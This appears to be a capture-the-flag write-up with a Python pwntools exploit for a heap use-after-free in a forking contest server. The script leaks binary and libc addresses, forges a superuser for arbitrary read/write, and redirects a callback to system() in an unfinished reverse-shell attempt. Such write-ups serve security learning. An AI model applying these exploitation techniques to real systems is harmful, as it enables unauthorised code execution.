@@ -1,0 +1,128 @@
+A really strange challenge. The remote hosting of it, not the challenge itself.
+Forking server, therefore no real aslr.
+Bug was a UAF when deleting the currently selected user in the 2nd rboy submenu.
+Exploitation steps:
+> login as neil
+> login in 2nd menu as rboy
+> delete neil
+> logout to 1st menu (we are now dangling neil)
+> leak some ptrs
+> login as rboy again
+> create a mission (overlaps with UAF neil), startdate overlaps with password ptr, year with user rights
+> logout to 1st menu, (we are now dangling crafted superuser)
+> by editing our password we have arbitrary rw
+> leak base address by finding a pointer to the rocket type (0x...020) by scraping the heap
+> find out libc and it's base by leaking some GOT entries
+> have fun
+
+The last step took the longest and in the end didn't happen bc of time constraints.
+As we are a forking server, we couldn't just call some one gadget because no dup2 to our fd.
+Therefore i tried to get some system(...) call working and open up a reverse shell.
+For this to work quickly I overwrote libc's free hook with system. Hower no shell.
+Then i overwrote the mission start callback ptr with the address of system.
+If we create a new mission, it is called with the mission codename as its 1st argument.
+For this to work the description must contain "wet condition". However no shell.
+Also no time left.
+
+
+from pwn import *
+
+def sploit(off):
+    # r = remote('localhost', 52112)
+    r = remote('gamebox1.reply.it', 52112)
+
+    r.recvuntil('Password:')
+    r.sendline('L39ZTvwaHegpVb9')
+
+    # login as neil
+    r.recvuntil('Username:')
+    r.sendline('neil')
+    r.recvuntil('Password:')
+    r.sendline('m00n')
+
+    # login into rboy menu
+    r.recvuntil(">")
+    r.sendline('4')
+    r.recvuntil('Username:')
+    r.sendline('rboy')
+    r.recvuntil('Password:')
+    r.sendline('rboy')
+
+    # delete and return neil
+    r.sendline('6')
+    r.recvuntil('>')
+    r.sendline('1')
+    r.recvuntil('>')
+    r.sendline('7')
+
+    # view neils info, UAF, leaks some ptrs
+    r.recvuntil('>')
+    r.sendline('1')
+    r.recvuntil('Name: ')
+    leak1 = r.recvuntil('Surname: ')[:-10]
+    leak2 = r.recvuntil('Username: ')[:-11]
+    leak3 = r.recvuntil('ID:')[:-4]
+
+    print(hexdump(leak1))
+    print(hexdump(leak2))
+    print(hexdump(leak3))
+
+    # login again
+    r.recvuntil('>')
+    r.sendline('4')
+    r.recvuntil('Username:')
+    r.sendline('rboy')
+    r.recvuntil('Password:')
+    r.sendline('rboy')
+
+    # creates a mission struct over the peviously deleted neil user.
+    # Make rights = 2 for edit access, date is our rw ptr and overlaps with the users password field.
+    r.sendline('2')
+    r.sendlineafter(':', 'a' * 0x40)
+    r.sendlineafter(':', 'structure')
+    r.sendlineafter(':', 'a' * 0x40)
+    # -> leaked ptr2 0x55555555e120
+    # -> our heap pos 0x55555555e110
+    r.sendlineafter(':', str(struct.unpack('<Q', leak2.ljust(8, '\0'))[0] + off))
+    r.sendlineafter(':', '2')
+
+    # logout, we are now using our own fake user with rights = 2
+    r.recvuntil('>')
+    r.sendline('7')
+
+    # leak ptr of rocket name and calculate base ptr out of it
+    r.sendlineafter('>', '8')
+    r.recvuntil('Password: ')
+    baseleak = r.recvuntil('----')[:-6].ljust(8, '\0')
+    baseleak = struct.unpack('<Q', baseleak)[0] - 0x7020
+
+    print("[base]" + hex(baseleak))
+
+    # Change arb rw ptr to atol GOT entry
+    r.sendlineafter('>', '4')
+    r.sendlineafter('Password:', b"AAAAAAAA" + struct.pack('<Q', baseleak + 0x6f50)[:-1])
+
+    # leak ptr of atol, calculate libc base out of it
+    r.sendlineafter('>', '8')
+    r.recvuntil('Name: ')
+    libcleak = r.recvuntil('2) ')[:-4].ljust(8, '\0')
+    libcleak = struct.unpack('<Q', libcleak)[0] - 0x36c70
+
+    print("[libc]" + hex(libcleak))
+
+    # change rw ptr to mission create callback ptr
+    r.sendlineafter('>', '4')
+    r.sendlineafter('Password: ', b"AAAAAAAA" + struct.pack('<Q', baseleak + 0x7060)[:-1])
+
+    # overwrite with system()
+    r.sendlineafter('>', '8')
+    r.sendlineafter('>', '1')
+    r.sendlineafter('Name: ', struct.pack('<Q', libcleak + 0x3f480)[:-1])
+
+    # codename: /bin/bash -c "..."
+    # description: wet condition
+    r.interactive()
+
+
+sploit(492 * 8)
+# sploit(-0x30)
